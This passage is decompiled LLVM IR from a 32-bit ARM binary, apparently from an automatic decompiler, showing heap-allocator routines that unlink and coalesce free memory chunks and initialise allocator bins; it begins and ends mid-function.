  %v2_d300 = inttoptr i32 %v1_d300 to i32*
  %v3_d300 = load i32, i32* %v2_d300, align 4
  store i32 %v3_d300, i32* %sl.global-to-local, align 4
  %v1_d304 = add i32 %v2_d2f8, 4
  %v2_d304 = inttoptr i32 %v1_d304 to i32*
  %v3_d304 = load i32, i32* %v2_d304, align 4
  store i32 %v3_d304, i32* %r8.global-to-local, align 4
  br i1 %v2_d2fc, label %dec_label_pc_d30c, label %dec_label_pc_d340

dec_label_pc_d30c:                                ; preds = %dec_label_pc_d2f0
  %v1_d30c = inttoptr i32 %v0_d30c to i32*
  %v2_d30c = load i32, i32* %v1_d30c, align 4
  store i32 %v2_d30c, i32* %r5.global-to-local, align 4
  %v2_d310 = sub i32 %v0_d30c, %v2_d30c
  store i32 %v2_d310, i32* %r3.global-to-local, align 4
  %v1_d314 = add i32 %v2_d310, 8
  %v2_d314 = inttoptr i32 %v1_d314 to i32*
  %v3_d314 = load i32, i32* %v2_d314, align 4
  store i32 %v3_d314, i32* %ip.global-to-local, align 4
  %v1_d318 = add i32 %v3_d314, 12
  %v2_d318 = inttoptr i32 %v1_d318 to i32*
  %v3_d318 = load i32, i32* %v2_d318, align 4
  store i32 %v3_d318, i32* %r1.global-to-local, align 4
  %v9_d31c = icmp eq i32 %v3_d318, %v2_d310
  %v1_d320 = add i32 %v2_d310, 12
  %v2_d320 = inttoptr i32 %v1_d320 to i32*
  %v3_d320 = load i32, i32* %v2_d320, align 4
  store i32 %v3_d320, i32* %r2.global-to-local, align 4
  br i1 %v9_d31c, label %dec_label_pc_d328, label %dec_label_pc_d384

dec_label_pc_d328:                                ; preds = %dec_label_pc_d30c
  %v1_d328 = add i32 %v3_d320, 8
  %v2_d328 = inttoptr i32 %v1_d328 to i32*
  %v3_d328 = load i32, i32* %v2_d328, align 4
  store i32 %v3_d328, i32* %r3.global-to-local, align 4
  %v9_d32c = icmp eq i32 %v3_d328, %v2_d310
  br i1 %v9_d32c, label %dec_label_pc_d334, label %dec_label_pc_d384

dec_label_pc_d334:                                ; preds = %dec_label_pc_d328
  store i32 %v3_d314, i32* %v2_d328, align 4
  %v0_d338 = load i32, i32* %r2.global-to-local, align 4
  %v1_d338 = load i32, i32* %ip.global-to-local, align 4
  %v2_d338 = add i32 %v1_d338, 12
  %v3_d338 = inttoptr i32 %v2_d338 to i32*
  store i32 %v0_d338, i32* %v3_d338, align 4
  %v0_d33c = load i32, i32* %lr.global-to-local, align 4
  %v1_d33c = load i32, i32* %r5.global-to-local, align 4
  %v2_d33c = add i32 %v1_d33c, %v0_d33c
  store i32 %v2_d33c, i32* %lr.global-to-local, align 4
  %v0_d344.pre = load i32, i32* @r0, align 4
  %v0_d348.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_d340

dec_label_pc_d340:                                ; preds = %dec_label_pc_d2f0, %dec_label_pc_d334
  %v0_d3b8 = phi i32 [ %v1_d2f4, %dec_label_pc_d2f0 ], [ %v2_d33c, %dec_label_pc_d334 ]
  %v0_d348 = phi i32 [ %v3_d304, %dec_label_pc_d2f0 ], [ %v0_d348.pre, %dec_label_pc_d334 ]
  %v1_d35c = phi i32 [ %v2_d2f8, %dec_label_pc_d2f0 ], [ %v0_d344.pre, %dec_label_pc_d334 ]
  %v0_d340 = load i32, i32* @r4, align 4
  %v1_d340 = add i32 %v0_d340, 44
  %v2_d340 = inttoptr i32 %v1_d340 to i32*
  %v3_d340 = load i32, i32* %v2_d340, align 4
  store i32 %v3_d340, i32* %r3.global-to-local, align 4
  %v9_d344 = icmp eq i32 %v1_d35c, %v3_d340
  %v1_d348 = and i32 %v0_d348, -4
  store i32 %v1_d348, i32* %r5.global-to-local, align 4
  br i1 %v9_d344, label %dec_label_pc_d3b8, label %dec_label_pc_d350

dec_label_pc_d350:                                ; preds = %dec_label_pc_d340
  %v2_d350 = add i32 %v1_d35c, %v1_d348
  store i32 %v2_d350, i32* %r3.global-to-local, align 4
  %v1_d354 = add i32 %v2_d350, 4
  %v2_d354 = inttoptr i32 %v1_d354 to i32*
  %v3_d354 = load i32, i32* %v2_d354, align 4
  store i32 %v3_d354, i32* %r3.global-to-local, align 4
  %v1_d358 = urem i32 %v3_d354, 2
  %v2_d358 = icmp eq i32 %v1_d358, 0
  %v2_d35c = add i32 %v1_d35c, 4
  %v3_d35c = inttoptr i32 %v2_d35c to i32*
  store i32 %v1_d348, i32* %v3_d35c, align 4
  br i1 %v2_d358, label %dec_label_pc_d364, label %dec_label_pc_d350.dec_label_pc_d394_crit_edge

dec_label_pc_d350.dec_label_pc_d394_crit_edge:    ; preds = %dec_label_pc_d350
  %v0_d398.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_d394

dec_label_pc_d364:                                ; preds = %dec_label_pc_d350
  %v0_d364 = load i32, i32* @r0, align 4
  %v1_d364 = add i32 %v0_d364, 8
  %v2_d364 = inttoptr i32 %v1_d364 to i32*
  %v3_d364 = load i32, i32* %v2_d364, align 4
  store i32 %v3_d364, i32* %ip.global-to-local, align 4
  %v1_d368 = add i32 %v3_d364, 12
  %v2_d368 = inttoptr i32 %v1_d368 to i32*
  %v3_d368 = load i32, i32* %v2_d368, align 4
  store i32 %v3_d368, i32* %r3.global-to-local, align 4
  %v9_d36c = icmp eq i32 %v3_d368, %v0_d364
  %v1_d370 = add i32 %v0_d364, 12
  %v2_d370 = inttoptr i32 %v1_d370 to i32*
  %v3_d370 = load i32, i32* %v2_d370, align 4
  store i32 %v3_d370, i32* %r2.global-to-local, align 4
  br i1 %v9_d36c, label %dec_label_pc_d378, label %dec_label_pc_d384

dec_label_pc_d378:                                ; preds = %dec_label_pc_d364
  %v1_d378 = add i32 %v3_d370, 8
  %v2_d378 = inttoptr i32 %v1_d378 to i32*
  %v3_d378 = load i32, i32* %v2_d378, align 4
  store i32 %v3_d378, i32* %r3.global-to-local, align 4
  %v9_d37c = icmp eq i32 %v3_d378, %v0_d364
  br i1 %v9_d37c, label %dec_label_pc_d388, label %dec_label_pc_d384

dec_label_pc_d384:                                ; preds = %dec_label_pc_d364, %dec_label_pc_d328, %dec_label_pc_d30c, %dec_label_pc_d378
  %v0_d384 = call i32 @function_d6d4()
  store i32 %v0_d384, i32* @r0, align 4
  %v0_d388.pre = load i32, i32* @ip, align 4
  %v1_d388.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_d388

dec_label_pc_d388:                                ; preds = %dec_label_pc_d378, %dec_label_pc_d384
  %v1_d388 = phi i32 [ %v3_d370, %dec_label_pc_d378 ], [ %v1_d388.pre, %dec_label_pc_d384 ]
  %v0_d388 = phi i32 [ %v3_d364, %dec_label_pc_d378 ], [ %v0_d388.pre, %dec_label_pc_d384 ]
  %v2_d388 = add i32 %v1_d388, 8
  %v3_d388 = inttoptr i32 %v2_d388 to i32*
  store i32 %v0_d388, i32* %v3_d388, align 4
  %v0_d38c = load i32, i32* %r2.global-to-local, align 4
  %v1_d38c = load i32, i32* %ip.global-to-local, align 4
  %v2_d38c = add i32 %v1_d38c, 12
  %v3_d38c = inttoptr i32 %v2_d38c to i32*
  store i32 %v0_d38c, i32* %v3_d38c, align 4
  %v0_d390 = load i32, i32* %lr.global-to-local, align 4
  %v1_d390 = load i32, i32* %r5.global-to-local, align 4
  %v2_d390 = add i32 %v1_d390, %v0_d390
  store i32 %v2_d390, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_d394

dec_label_pc_d394:                                ; preds = %dec_label_pc_d350.dec_label_pc_d394_crit_edge, %dec_label_pc_d388
  %v0_d398 = phi i32 [ %v0_d398.pre, %dec_label_pc_d350.dec_label_pc_d394_crit_edge ], [ %v2_d390, %dec_label_pc_d388 ]
  %v0_d394 = load i32, i32* %r7.global-to-local, align 4
  %v1_d394 = add i32 %v0_d394, 8
  %v2_d394 = inttoptr i32 %v1_d394 to i32*
  %v3_d394 = load i32, i32* %v2_d394, align 4
  store i32 %v3_d394, i32* %r2.global-to-local, align 4
  %v1_d398 = or i32 %v0_d398, 1
  store i32 %v1_d398, i32* %r3.global-to-local, align 4
  %v0_d39c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_d39c, i32* %v2_d394, align 4
  %v0_d3a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_d3a0 = load i32, i32* %r2.global-to-local, align 4
  %v2_d3a0 = add i32 %v1_d3a0, 12
  %v3_d3a0 = inttoptr i32 %v2_d3a0 to i32*
  store i32 %v0_d3a0, i32* %v3_d3a0, align 4
  %v0_d3a4 = load i32, i32* %lr.global-to-local, align 4
  %v1_d3a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_d3a4 = add i32 %v1_d3a4, %v0_d3a4
  %v4_d3a4 = inttoptr i32 %v3_d3a4 to i32*
  store i32 %v0_d3a4, i32* %v4_d3a4, align 4
  %v0_d3a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_d3a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_d3a8 = add i32 %v1_d3a8, 4
  %v3_d3a8 = inttoptr i32 %v2_d3a8 to i32*
  store i32 %v0_d3a8, i32* %v3_d3a8, align 4
  %v0_d3ac = load i32, i32* %r2.global-to-local, align 4
  %v1_d3ac = load i32, i32* %r1.global-to-local, align 4
  %v2_d3ac = add i32 %v1_d3ac, 8
  %v3_d3ac = inttoptr i32 %v2_d3ac to i32*
  store i32 %v0_d3ac, i32* %v3_d3ac, align 4
  %v0_d3b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_d3b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_d3b0 = add i32 %v1_d3b0, 12
  %v3_d3b0 = inttoptr i32 %v2_d3b0 to i32*
  store i32 %v0_d3b0, i32* %v3_d3b0, align 4
  br label %dec_label_pc_d3c8

dec_label_pc_d3b8:                                ; preds = %dec_label_pc_d340
  %v2_d3b8 = add i32 %v1_d348, %v0_d3b8
  %v1_d3bc = or i32 %v2_d3b8, 1
  store i32 %v1_d3bc, i32* %r3.global-to-local, align 4
  %v1_d3c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_d3c0 = add i32 %v1_d3c0, 4
  %v3_d3c0 = inttoptr i32 %v2_d3c0 to i32*
  store i32 %v1_d3bc, i32* %v3_d3c0, align 4
  %v0_d3c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_d3c4 = load i32, i32* @r4, align 4
  %v2_d3c4 = add i32 %v1_d3c4, 44
  %v3_d3c4 = inttoptr i32 %v2_d3c4 to i32*
  store i32 %v0_d3c4, i32* %v3_d3c4, align 4
  br label %dec_label_pc_d3c8

dec_label_pc_d3c8:                                ; preds = %dec_label_pc_d394, %dec_label_pc_d3b8
  %v0_d3c8 = load i32, i32* %sl.global-to-local, align 4
  %v2_d3c8 = icmp eq i32 %v0_d3c8, 0
  store i32 %v0_d3c8, i32* %r1.global-to-local, align 4
  br i1 %v2_d3c8, label %dec_label_pc_d3d4.loopexit, label %dec_label_pc_d2f0

dec_label_pc_d3d4.loopexit:                       ; preds = %dec_label_pc_d3c8
  %v0_d3d4.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_d3d4.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_d3d4

dec_label_pc_d3d4:                                ; preds = %dec_label_pc_d3d4.loopexit, %dec_label_pc_d2e0
  %v1_d3d4 = phi i32 [ %v1_d3d4.pre, %dec_label_pc_d3d4.loopexit ], [ %v1_d3d410, %dec_label_pc_d2e0 ]
  %v0_d3dc = phi i32 [ %v0_d3d4.pre, %dec_label_pc_d3d4.loopexit ], [ %v1_d2ec, %dec_label_pc_d2e0 ]
  %v9_d3d4 = icmp eq i32 %v0_d3dc, %v1_d3d4
  br i1 %v9_d3d4, label %dec_label_pc_d44c, label %dec_label_pc_d3dc

dec_label_pc_d3dc:                                ; preds = %dec_label_pc_d3d4
  %v1_d3dc = add i32 %v0_d3dc, 4
  store i32 %v1_d3dc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d2e0

dec_label_pc_d3e4.dec_label_pc_d3e4_crit_edge:    ; preds = %dec_label_pc_d3e4.preheader, %dec_label_pc_d3e4.dec_label_pc_d3e4_crit_edge
  %v0_d3e4.pre = load i32, i32* @r4, align 4
  %v1_d3e4.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_d3e4 = mul i32 %v1_d3e4.pre, 8
  %v5_d3e4 = add i32 %v4_d3e4, %v0_d3e4.pre
  %v1_d3e8 = add i32 %v1_d3e4.pre, 1
  store i32 %v1_d3e8, i32* %r2.global-to-local, align 4
  %v1_d3ec = add i32 %v5_d3e4, 44
  store i32 %v1_d3ec, i32* %r3.global-to-local, align 4
  %v2_d3f4 = add i32 %v5_d3e4, 52
  %v3_d3f4 = inttoptr i32 %v2_d3f4 to i32*
  store i32 %v1_d3ec, i32* %v3_d3f4, align 4
  %v0_d3f8 = load i32, i32* %r3.global-to-local, align 4
  %v2_d3f8 = add i32 %v0_d3f8, 12
  %v3_d3f8 = inttoptr i32 %v2_d3f8 to i32*
  store i32 %v0_d3f8, i32* %v3_d3f8, align 4
  %v7_d3fc = icmp sgt i32 %v1_d3e8, 95
  br i1 %v7_d3fc, label %dec_label_pc_d400, label %dec_label_pc_d3e4.dec_label_pc_d3e4_crit_edge

dec_label_pc_d400:                                ; preds = %dec_label_pc_d3e4.dec_label_pc_d3e4_crit_edge
  %v0_d400 = load i32, i32* @r4, align 4
  %v1_d400 = inttoptr i32 %v0_d400 to i32*
  %v2_d400 = load i32, i32* %v1_d400, align 4
  store i32 %v2_d400, i32* %r2.global-to-local, align 4
  %v1_d404 = add i32 %v0_d400, 864
  %v2_d404 = inttoptr i32 %v1_d404 to i32*
  %v3_d404 = load i32, i32* %v2_d404, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_d40c = urem i32 %v2_d400, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_d414 = or i32 %v3_d404, 1
  store i32 %v1_d414, i32* %r1.global-to-local, align 4
  %v1_d418 = or i32 %v1_d40c, 72
  store i32 %v1_d418, i32* %r2.global-to-local, align 4
  %v1_d41c = add i32 %v0_d400, 52
  store i32 %v1_d41c, i32* %ip.global-to-local, align 4
  %v2_d420 = add i32 %v0_d400, 840
  %v3_d420 = inttoptr i32 %v2_d420 to i32*
  store i32 0, i32* %v3_d420, align 4
  %v0_d424 = load i32, i32* %r3.global-to-local, align 4
  %v1_d424 = add i32 %v0_d424, 65536
  store i32 %v1_d424, i32* %r3.global-to-local, align 4
  %v0_d428 = load i32, i32* %r0.global-to-local, align 4
  %v1_d428 = load i32, i32* @r4, align 4
  %v2_d428 = add i32 %v1_d428, 836
  %v3_d428 = inttoptr i32 %v2_d428 to i32*
  store i32 %v0_d428, i32* %v3_d428, align 4
  %v0_d42c = load i32, i32* %r0.global-to-local, align 4
  %v1_d42c = load i32, i32* @r4, align 4
  %v2_d42c = add i32 %v1_d42c, 844
  %v3_d42c = inttoptr i32 %v2_d42c to i32*
  store i32 %v0_d42c, i32* %v3_d42c, align 4
  %v0_d430 = load i32, i32* %r3.global-to-local, align 4
  %v1_d430 = load i32, i32* @r4, align 4
  %v2_d430 = add i32 %v1_d430, 852
  %v3_d430 = inttoptr i32 %v2_d430 to i32*
  store i32 %v0_d430, i32* %v3_d430, align 4
  %v0_d434 = load i32, i32* %r1.global-to-local, align 4
  %v1_d434 = load i32, i32* @r4, align 4
  %v2_d434 = add i32 %v1_d434, 864
  %v3_d434 = inttoptr i32 %v2_d434 to i32*
  store i32 %v0_d434, i32* %v3_d434, align 4
  %v0_d438 = load i32, i32* %r2.global-to-local, align 4
  %v1_d438 = load i32, i32* @r4, align 4
  %v2_d438 = inttoptr i32 %v1_d438 to i32*
  store i32 %v0_d438, i32* %v2_d438, align 4
  %v0_d43c = load i32, i32* %ip.global-to-local, align 4
  %v1_d43c = load i32, i32* @r4, align 4
  %v2_d43c = add i32 %v1_d43c, 44
  %v3_d43c = inttoptr i32 %v2_d43c to i32*
  store i32 %v0_d43c, i32* %v3_d43c, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_d444 = call i32 @function_da0c(i32 30)
  store i32 %v1_d444, i32* @r0, align 4
  %v1_d448 = load i32, i32* @r4, align 4
  %v2_d448 = add i32 %v1_d448, 860
  %v3_d448 = inttoptr i32 %v2_d448 to i32*
  store i32 %v1_d444, i32* %v3_d448, align 4
  br label %dec_label_pc_d44c

dec_label_pc_d44c:                                ; preds = %dec_label_pc_d3d4, %dec_label_pc_d400
  %v2_d450 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_d450, i32* @r4, align 4
  %v1_d454 = load i32, i32* @r0, align 4
  ret i32 %v1_d454

; uselistorder directives
  uselistorder i32 %v0_d400, { 1, 0, 2, 3 }
  uselistorder i32 %v0_d3f8, { 1, 0 }
  uselistorder i32 %v1_d3dc, { 1, 0 }
  uselistorder i32 %v0_d3c8, { 0, 2, 1 }
  uselistorder i32 %v0_d3a4, { 1, 0 }
  uselistorder i32 %v1_d2f4, { 1, 0, 2 }
  uselistorder i32 %v0_d30c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_d2cc, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 1, 20 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 5, 6, 7, 8, 9, 10, 11, 12, 3, 4, 13 }
  uselistorder i32* %lr.global-to-local, { 2, 0, 3, 5, 1, 4, 6 }
  uselistorder i32 30, { 1, 7, 4, 2, 5, 3, 6, 0 }
  uselistorder label %dec_label_pc_d44c, { 1, 0 }
  uselistorder label %dec_label_pc_d3e4.dec_label_pc_d3e4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_d3c8, { 1, 0 }
  uselistorder label %dec_label_pc_d394, { 1, 0 }
  uselistorder label %dec_label_pc_d388, { 1, 0 }
  uselistorder label %dec_label_pc_d384, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_d340, { 1, 0 }
}

define i32 @function_d458() local_unnamed_addr {
dec_label_pc_d458:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_d458 = load i32, i32* @r4, align 4
  %v6_d458 = load i32, i32* @r5, align 4
  %v9_d458 = load i32, i32* @r6, align 4
  %v12_d458 = load i32, i32* @r7, align 4
  %v18_d458 = load i32, i32* @lr, align 4
  %v0_d460 = load i32, i32* @r0, align 4
  store i32 %v0_d460, i32* @r6, align 4
  %v2_d460 = icmp eq i32 %v0_d460, 0
  %v2_d464 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* @r7, align 4
  br i1 %v2_d460, label %dec_label_pc_d66c, label %dec_label_pc_d470

dec_label_pc_d470:                                ; preds = %dec_label_pc_d458
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_d474 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 108) to i32*), align 4
  store i32 %v4_d474, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_d474, i32* %r2.global-to-local, align 4
  %v4_d480 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 68) to i32*), align 4
  store i32 %v4_d480, i32* %r1.global-to-local, align 4
  store i32 %v2_d464, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_d48c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 112) to i32*), align 4
  store i32 %v4_d48c, i32* %ip.global-to-local, align 4
  store i32 54424, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_d48c)
  %v0_d498 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d498, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_d4a0 = load i32, i32* @r7, align 4
  %v2_d4a0 = add i32 %v0_d4a0, 16
  %v3_d4a0 = inttoptr i32 %v2_d4a0 to i32*
  %v4_d4a0 = load i32, i32* %v3_d4a0, align 4
  store i32 %v4_d4a0, i32* %ip.global-to-local, align 4
  store i32 54444, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_d4a0)
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_d4b0 = load i32, i32* @r7, align 4
  %v2_d4b0 = add i32 %v0_d4b0, 64
  %v3_d4b0 = inttoptr i32 %v2_d4b0 to i32*
  %v4_d4b0 = load i32, i32* %v3_d4b0, align 4
  store i32 %v4_d4b0, i32* @lr, align 4
  %v0_d4b4 = load i32, i32* @r6, align 4
  %v1_d4b4 = add i32 %v0_d4b4, -4
  %v2_d4b4 = inttoptr i32 %v1_d4b4 to i32*
  %v3_d4b4 = load i32, i32* %v2_d4b4, align 4
  store i32 %v3_d4b4, i32* %r2.global-to-local, align 4
  %v1_d4b8 = inttoptr i32 %v4_d4b0 to i32*
  %v2_d4b8 = load i32, i32* %v1_d4b8, align 4
  store i32 %v2_d4b8, i32* %r3.global-to-local, align 4
  %v1_d4bc = and i32 %v3_d4b4, -4
  store i32 %v1_d4bc, i32* %ip.global-to-local, align 4
  %v1_d4c0 = add i32 %v0_d4b4, -8
  store i32 %v1_d4c0, i32* @r5, align 4
  store i32 %v1_d4c0, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_d4bc, %v2_d4b8
  br i1 %tmp, label %dec_label_pc_d4f0, label %dec_label_pc_d4d0

dec_label_pc_d4d0:                                ; preds = %dec_label_pc_d470
  %v1_d4d0 = or i32 %v2_d4b8, 3
  store i32 %v1_d4d0, i32* %r3.global-to-local, align 4
  store i32 %v1_d4d0, i32* %v1_d4b8, align 4
  %v3_d4d4 = load i32, i32* @lr, align 4
  %v4_d4d4 = add i32 %v3_d4d4, -8
  store i32 %v4_d4d4, i32* %lr.global-to-local, align 4
  %v0_d4d8 = load i32, i32* %ip.global-to-local, align 4
  %v3_d4d8 = udiv i32 %v0_d4d8, 8
  store i32 %v3_d4d8, i32* %r1.global-to-local, align 4
  %v1_d4dc = add i32 %v3_d4d4, -4
  store i32 %v1_d4dc, i32* %r2.global-to-local, align 4
  %v4_d4e0 = mul nuw i32 %v3_d4d8, 4
  %v5_d4e0 = add i32 %v4_d4e0, %v1_d4dc
  %v6_d4e0 = inttoptr i32 %v5_d4e0 to i32*
  %v7_d4e0 = load i32, i32* %v6_d4e0, align 4
  store i32 %v7_d4e0, i32* %r3.global-to-local, align 4
  %v1_d4e4 = load i32, i32* @r5, align 4
  %v2_d4e4 = add i32 %v1_d4e4, 8
  %v3_d4e4 = inttoptr i32 %v2_d4e4 to i32*
  store i32 %v7_d4e0, i32* %v3_d4e4, align 4
  %v0_d4e8 = load i32, i32* @r5, align 4
  %v1_d4e8 = load i32, i32* %r2.global-to-local, align 4
  %v2_d4e8 = load i32, i32* %r1.global-to-local, align 4
  %v5_d4e8 = mul i32 %v2_d4e8, 4
  %v6_d4e8 = add i32 %v5_d4e8, %v1_d4e8
  %v7_d4e8 = inttoptr i32 %v6_d4e8 to i32*
  store i32 %v0_d4e8, i32* %v7_d4e8, align 4
  br label %dec_label_pc_d654

dec_label_pc_d4f0:                                ; preds = %dec_label_pc_d470
  %v1_d4f0 = and i32 %v3_d4b4, 2
  %v2_d4f0 = icmp eq i32 %v1_d4f0, 0
  br i1 %v2_d4f0, label %dec_label_pc_d4f8, label %dec_label_pc_d62c

dec_label_pc_d4f8:                                ; preds = %dec_label_pc_d4f0
  %v1_d4f8 = or i32 %v2_d4b8, 1
  store i32 %v1_d4f8, i32* %r3.global-to-local, align 4
  store i32 %v1_d4f8, i32* %v1_d4b8, align 4
  %v0_d500 = load i32, i32* @r6, align 4
  %v1_d500 = add i32 %v0_d500, -4
  %v2_d500 = inttoptr i32 %v1_d500 to i32*
  %v3_d500 = load i32, i32* %v2_d500, align 4
  store i32 %v3_d500, i32* %r3.global-to-local, align 4
  %v0_d504 = load i32, i32* @r5, align 4
  %v1_d504 = load i32, i32* %ip.global-to-local, align 4
  %v2_d504 = add i32 %v1_d504, %v0_d504
  store i32 %v2_d504, i32* %lr.global-to-local, align 4
  %v1_d508 = urem i32 %v3_d500, 2
  %v2_d508 = icmp eq i32 %v1_d508, 0
  %v1_d50c = add i32 %v2_d504, 4
  %v2_d50c = inttoptr i32 %v1_d50c to i32*
  %v3_d50c = load i32, i32* %v2_d50c, align 4
  store i32 %v3_d50c, i32* %r8.global-to-local, align 4
  br i1 %v2_d508, label %dec_label_pc_d514, label %dec_label_pc_d548

dec_label_pc_d514:                                ; preds = %dec_label_pc_d4f8
  %v1_d514 = add i32 %v0_d500, -8
  %v2_d514 = inttoptr i32 %v1_d514 to i32*
  %v3_d514 = load i32, i32* %v2_d514, align 4
  store i32 %v3_d514, i32* %r1.global-to-local, align 4
  %v2_d518 = sub i32 %v0_d504, %v3_d514
  store i32 %v2_d518, i32* %r3.global-to-local, align 4
  %v1_d51c = add i32 %v2_d518, 8
  %v2_d51c = inttoptr i32 %v1_d51c to i32*
  %v3_d51c = load i32, i32* %v2_d51c, align 4
  store i32 %v3_d51c, i32* %r2.global-to-local, align 4
  %v1_d520 = add i32 %v3_d51c, 12
  %v2_d520 = inttoptr i32 %v1_d520 to i32*
  %v3_d520 = load i32, i32* %v2_d520, align 4
  store i32 %v3_d520, i32* %r4.global-to-local, align 4
  %v9_d524 = icmp eq i32 %v3_d520, %v2_d518
  %v1_d528 = add i32 %v2_d518, 12
  %v2_d528 = inttoptr i32 %v1_d528 to i32*
  %v3_d528 = load i32, i32* %v2_d528, align 4
  store i32 %v3_d528, i32* %r0.global-to-local, align 4
  br i1 %v9_d524, label %dec_label_pc_d530, label %dec_label_pc_d594

dec_label_pc_d530:                                ; preds = %dec_label_pc_d514
  %v1_d530 = add i32 %v3_d528, 8
  %v2_d530 = inttoptr i32 %v1_d530 to i32*
  %v3_d530 = load i32, i32* %v2_d530, align 4
  store i32 %v3_d530, i32* %r3.global-to-local, align 4
  %v9_d534 = icmp eq i32 %v3_d530, %v2_d518
  br i1 %v9_d534, label %dec_label_pc_d53c, label %dec_label_pc_d594

dec_label_pc_d53c:                                ; preds = %dec_label_pc_d530
  store i32 %v3_d51c, i32* %v2_d530, align 4
  %v0_d540 = load i32, i32* %r0.global-to-local, align 4
  %v1_d540 = load i32, i32* %r2.global-to-local, align 4
  %v2_d540 = add i32 %v1_d540, 12
  %v3_d540 = inttoptr i32 %v2_d540 to i32*
  store i32 %v0_d540, i32* %v3_d540, align 4
  %v0_d544 = load i32, i32* %ip.global-to-local, align 4
  %v1_d544 = load i32, i32* %r1.global-to-local, align 4
  %v2_d544 = add i32 %v1_d544, %v0_d544
  store i32 %v2_d544, i32* %ip.global-to-local, align 4
  %v0_d554.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_d558.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_d548

dec_label_pc_d548:                                ; preds = %dec_label_pc_d4f8, %dec_label_pc_d53c
  %v0_d5d4 = phi i32 [ %v1_d504, %dec_label_pc_d4f8 ], [ %v2_d544, %dec_label_pc_d53c ]
  %v0_d558 = phi i32 [ %v3_d50c, %dec_label_pc_d4f8 ], [ %v0_d558.pre, %dec_label_pc_d53c ]
  %v1_d56c = phi i32 [ %v2_d504, %dec_label_pc_d4f8 ], [ %v0_d554.pre, %dec_label_pc_d53c ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_d54c = load i32, i32* @r7, align 4
  %v2_d54c = add i32 %v0_d54c, 64
  %v3_d54c = inttoptr i32 %v2_d54c to i32*
  %v4_d54c = load i32, i32* %v3_d54c, align 4
  store i32 %v4_d54c, i32* %r2.global-to-local, align 4
  %v1_d550 = add i32 %v4_d54c, 44
  %v2_d550 = inttoptr i32 %v1_d550 to i32*
  %v3_d550 = load i32, i32* %v2_d550, align 4
  store i32 %v3_d550, i32* %r3.global-to-local, align 4
  %v9_d554 = icmp eq i32 %v1_d56c, %v3_d550
  %v1_d558 = and i32 %v0_d558, -4
  store i32 %v1_d558, i32* %r0.global-to-local, align 4
  br i1 %v9_d554, label %dec_label_pc_d5d4, label %dec_label_pc_d560

dec_label_pc_d560:                                ; preds = %dec_label_pc_d548
  %v2_d560 = add i32 %v1_d56c, %v1_d558
  store i32 %v2_d560, i32* %r3.global-to-local, align 4
  %v1_d564 = add i32 %v2_d560, 4
  %v2_d564 = inttoptr i32 %v1_d564 to i32*
  %v3_d564 = load i32, i32* %v2_d564, align 4
  store i32 %v3_d564, i32* %r3.global-to-local, align 4
  %v1_d568 = urem i32 %v3_d564, 2
  %v2_d568 = icmp eq i32 %v1_d568, 0
  %v2_d56c = add i32 %v1_d56c, 4
  %v3_d56c = inttoptr i32 %v2_d56c to i32*
  store i32 %v1_d558, i32* %v3_d56c, align 4
  br i1 %v2_d568, label %dec_label_pc_d574, label %dec_label_pc_d560.dec_label_pc_d5a4_crit_edge

dec_label_pc_d560.dec_label_pc_d5a4_crit_edge:    ; preds = %dec_label_pc_d560
  %v0_d5b4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_d5a4

dec_label_pc_d574:                                ; preds = %dec_label_pc_d560
